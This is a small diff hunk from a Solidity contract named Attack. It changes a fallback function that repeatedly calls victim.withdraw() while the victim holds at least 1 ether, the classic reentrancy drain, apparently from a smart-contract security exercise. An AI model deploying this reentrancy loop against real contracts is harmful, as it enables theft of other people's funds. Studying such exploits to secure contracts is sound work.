@@ -11,7 +11,7 @@ contract Attack {
     
     fallback() external payable {
         if (address(victim).balance >= 1 ether){
-            victim.withdraw(1 ether);
+            victim.withdraw();
         }
     }
     
